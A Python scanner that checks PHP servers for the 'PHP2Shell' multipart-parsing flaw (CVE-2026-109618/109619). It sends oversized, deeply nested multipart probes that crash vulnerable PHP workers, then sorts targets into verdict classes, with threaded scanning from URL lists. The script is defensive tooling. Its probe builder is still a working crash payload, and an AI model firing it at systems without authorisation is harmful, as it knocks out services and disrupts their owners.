#!/usr/bin/env python3
"""
p2s_scan.py - PHP2Shell (CVE-2026-109618 / CVE-2026-109619) checker.

Sends one small control POST, then up to three malformed multipart probes
(1 / 8 / 20 MiB, 62-deep nested keys) and classifies each target as:

  VULNERABLE  confirmed: the page shows PHP's out-of-memory fatal error
              "in Unknown" raised while parsing the probe
  POTENTIAL   indirect sign only: empty 500/200, 502/503/504, dropped
              connection, or banner = unpatched release - verify manually
  SAFE        PHP stopped at the multipart parts limit (patched behaviour)
              or the X-Powered-By banner is a fixed release
  UNKNOWN     no usable signal (errors hidden, no banner, WAF, not PHP, ...)
  ERROR       could not connect / request failed

Only scan systems you are authorised to test: each probe kills the PHP
request (and the worker on PHP-FPM).

Usage:
  python3 p2s_scan.py -u http://127.0.0.1:8082
  python3 p2s_scan.py -l urls.txt -t 5 -o results.csv
"""

import argparse
import csv
import http.client
import json
import re
import socket
import ssl
import sys
import warnings
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlsplit

DEFAULT_PATH = "/index.php"
UA = "Mozilla/5.0 p2s_scan/1.0"
NESTED_KEYS = 62
PROBES = ((1, 4000), (8, 1020), (20, 1020))       # (MiB, parts)
CONTROL_BODY = b"--x\nContent-Disposition:name=a;filename=\n\n"
REJECTED = {400, 403, 411, 413, 414, 417, 422, 429, 431}
FIXED = {(8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12}
VERSION_RE = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)")
READ_LIMIT = 1 << 20

OOM = (b"Allowed memory size of ", b" bytes exhausted")
PARTS_LIMIT = b"Multipart body parts limit exceeded"

COLORS = {"VULNERABLE": "\033[91;1m", "POTENTIAL": "\033[95m", "SAFE": "\033[92m",
          "UNKNOWN": "\033[93m", "ERROR": "\033[90m"}
RESET = "\033[0m"


def build_probe(size_mib, parts):
    """Byte-identical to assetnote php2shell-scanner build_probe_body()."""
    size = size_mib << 20
    name = b"a[]" + b"[a]" * NESTED_KEYS
    base = (b"--\nContent-Disposition:name=" + name + b";filename=\n\n") * parts
    filler = (size - len(base)) // 3
    return (b"--\n" + b"x:\n" * filler + base[3:])[:-1]


def normalize(url):
    url = url.strip()
    if "://" not in url:
        url = "http://" + url
    u = urlsplit(url)
    if u.scheme not in ("http", "https") or not u.hostname:
        raise ValueError("invalid URL")
    path = u.path if u.path and u.path != "/" else DEFAULT_PATH
    if u.query:
        path += "?" + u.query
    return u.scheme, u.hostname, u.port, path


def insecure_context():
    """-k: no cert/hostname checks, and still talk to old TLS stacks."""
    ctx = ssl._create_unverified_context()
    try:
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", DeprecationWarning)
            ctx.minimum_version = ssl.TLSVersion.TLSv1
        ctx.set_ciphers("ALL:@SECLEVEL=0")
    except (ValueError, ssl.SSLError):
        pass  # local OpenSSL refuses; keep its defaults
    return ctx


def post(target, body, boundary, timeout, insecure):
    """Return (status, headers{lower:val}, body_bytes) or raise."""
    scheme, host, port, path = target
    if scheme == "https":
        ctx = insecure_context() if insecure else ssl.create_default_context()
        conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
    else:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
    headers = {
        "User-Agent": UA,
        "Content-Type": "multipart/form-data; boundary=" + boundary,
        "Connection": "close",
    }
    try:
        try:
            conn.request("POST", path, body=body, headers=headers)
        except (BrokenPipeError, ConnectionResetError):
            pass  # server may answer before reading the whole body
        r = conn.getresponse()
        data = r.read(READ_LIMIT)
        return r.status, {k.lower(): v for k, v in r.getheaders()}, data
    finally:
        conn.close()


def version_verdict(banner):
    m = VERSION_RE.search(banner or "")
    if not m:
        return None
    major, minor, patch = map(int, m.groups())
    fixed = FIXED.get((major, minor))
    if fixed is None:
        return "VULNERABLE" if (major, minor) < min(FIXED) else None
    return "SAFE" if patch >= fixed else "VULNERABLE"


def scan(url, timeout, insecure, quick):
    res = {"url": url, "verdict": "ERROR", "reason": "", "php": "", "status": ""}
    try:
        target = normalize(url)
        res["url"] = f"{target[0]}://{target[1]}{':' + str(target[2]) if target[2] else ''}{target[3]}"
    except ValueError as e:
        res["reason"] = str(e)
        return res

    # 1. control request: what does a normal answer look like?
    try:
        c_status, c_hdr, c_body = post(target, CONTROL_BODY, "x", timeout, insecure)
    except (OSError, http.client.HTTPException) as e:
        res["reason"] = f"control request failed: {e.__class__.__name__}: {e}"
        if isinstance(e, ssl.SSLCertVerificationError):
            res["reason"] += "  -> rerun with -k to skip certificate checks"
        return res
    banner = c_hdr.get("x-powered-by", "")
    res["status"] = c_status
    if c_status >= 500:
        res.update(verdict="UNKNOWN", reason=f"control request already returns HTTP {c_status}")
        res["php"] = banner
        return res

    # 2. probes
    blocked = None
    for i, (mib, parts) in enumerate(PROBES[:1] if quick else PROBES, 1):
        tag = f"probe {i} ({mib} MiB)"
        try:
            status, hdr, body = post(target, build_probe(mib, parts), "", timeout, insecure)
        except (socket.timeout, TimeoutError):
            res.update(verdict="UNKNOWN", reason=f"{tag}: timed out")
            break
        except (OSError, http.client.HTTPException) as e:
            # connection dropped with no response: worker died mid-request
            res.update(verdict="POTENTIAL",
                       reason=f"{tag}: connection dropped without a response ({e.__class__.__name__})")
            break
        banner = hdr.get("x-powered-by", banner)
        res["status"] = status

        if status in REJECTED:
            blocked = f"{tag} rejected with HTTP {status} before reaching PHP (WAF/proxy/limits)"
            break
        if all(s in body for s in OOM) and b"Unknown" in body:
            res.update(verdict="VULNERABLE",
                       reason=f"{tag}: PHP out-of-memory in 'Unknown' while parsing multipart")
            break
        if status == 500 and c_body and not body:
            res.update(verdict="POTENTIAL",
                       reason=f"{tag}: empty HTTP 500 (control returned content)")
            break
        if status in (502, 503, 504):
            res.update(verdict="POTENTIAL",
                       reason=f"{tag}: HTTP {status} from front-end (PHP-FPM worker died)")
            break
        if status == 200 and c_body and not body:
            res.update(verdict="POTENTIAL",
                       reason=f"{tag}: empty HTTP 200 (control returned content, worker died)")
            break
        if PARTS_LIMIT in body:
            res.update(verdict="SAFE",
                       reason=f"{tag}: PHP stopped at the multipart parts limit (patched behaviour)")
            break
        if version_verdict(banner) == "SAFE":
            res.update(verdict="SAFE", reason=f"no crash; banner reports fixed release {banner}")
            break

    res["php"] = banner
    if res["verdict"] in ("ERROR", "UNKNOWN") and not res["reason"].endswith("timed out"):
        by_ver = version_verdict(banner)
        if by_ver == "VULNERABLE":
            res.update(verdict="POTENTIAL",
                       reason=f"no crash seen; banner reports unpatched {banner} (verify manually)")
        elif by_ver == "SAFE":
            res.update(verdict="SAFE", reason=f"no crash; banner reports fixed release {banner}")
        elif blocked:
            res.update(verdict="UNKNOWN", reason=blocked)
        else:
            res.update(verdict="UNKNOWN", reason="no crash and no PHP version advertised")
    elif res["verdict"] == "POTENTIAL" and version_verdict(banner) == "VULNERABLE":
        res["reason"] += f"; banner reports unpatched {banner}"

    # Branches older than 8.2 never got a fix and also lack the multipart parts
    # limit, so any multipart flood exhausts memory: the crash is not PHP2Shell-specific.
    m = VERSION_RE.search(banner or "")
    if res["verdict"] in ("VULNERABLE", "POTENTIAL") and m and (int(m[1]), int(m[2])) < min(FIXED):
        res["reason"] += (f" | PHP {m[1]}.{m[2]} is end-of-life (no fix exists); crash is"
                          " not PHP2Shell-specific on this branch - upgrade regardless")
    return res


def load_targets(args):
    urls = list(args.url or [])
    if args.list:
        with open(args.list, encoding="utf-8") as f:
            urls += [l.strip() for l in f if l.strip() and not l.lstrip().startswith("#")]
    seen, out = set(), []
    for u in urls:
        if u not in seen:
            seen.add(u)
            out.append(u)
    return out


def save(results, path):
    if path.lower().endswith(".json"):
        with open(path, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2)
    else:
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=["url", "verdict", "php", "status", "reason"])
            w.writeheader()
            w.writerows(results)


def main():
    ap = argparse.ArgumentParser(description="PHP2Shell (CVE-2026-109618/109619) scanner")
    ap.add_argument("-u", "--url", action="append", help="target URL (repeatable)")
    ap.add_argument("-l", "--list", help="file with one URL per line (# = comment)")
    ap.add_argument("-t", "--threads", type=int, default=5, help="parallel targets (default 5)")
    ap.add_argument("--timeout", type=int, default=30, help="per-request timeout seconds (default 30)")
    ap.add_argument("-k", "--insecure", action="store_true", help="skip TLS certificate checks")
    ap.add_argument("--quick", action="store_true", help="send only the 1 MiB probe")
    ap.add_argument("-o", "--output", help="save results (.csv or .json)")
    ap.add_argument("--no-color", action="store_true")
    args = ap.parse_args()

    targets = load_targets(args)
    if not targets:
        ap.error("give -u URL and/or -l FILE")
    color = sys.stdout.isatty() and not args.no_color

    print(f"[*] {len(targets)} target(s), {args.threads} thread(s)\n")
    results = []
    with ThreadPoolExecutor(max_workers=max(1, args.threads)) as pool:
        for r in pool.map(lambda u: scan(u, args.timeout, args.insecure, args.quick), targets):
            results.append(r)
            v = r["verdict"]
            label = f"{COLORS[v]}{v:<10}{RESET}" if color else f"{v:<10}"
            php = f" [{r['php']}]" if r["php"] else ""
            print(f"{label} {r['url']}{php}\n           {r['reason']}")

    counts = {k: sum(r["verdict"] == k for r in results) for k in COLORS}
    print("\n" + "  ".join(f"{k}: {n}" for k, n in counts.items()))
    if args.output:
        save(results, args.output)
        print(f"[+] saved {args.output}")
    sys.exit(1 if counts["VULNERABLE"] else 2 if counts["POTENTIAL"] else 0)


if __name__ == "__main__":
    main()
